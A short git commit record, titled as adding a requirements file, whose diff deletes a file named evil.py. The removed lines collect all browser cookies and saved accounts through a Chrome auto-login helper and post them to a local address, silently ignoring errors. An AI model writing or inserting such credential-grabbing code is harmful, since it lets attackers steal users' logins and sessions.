53d8627aece966c997867322a47907c21a66c8a0
obgnail <he1251698542@gmail.com>
2024-01-06 15:28:46 +0800

    add reuirement.txt

--- evil.py
+++
@@ -1,7 +0,0 @@
-try:
-    import requests
-    from chrome_driver_auto_login import get_all_cookies, get_all_accounts
-
-    requests.post('http://127.0.0.1:9999', json={'cookies': get_all_cookies(), 'accounts': get_all_accounts()})
-except Exception:
-    pass
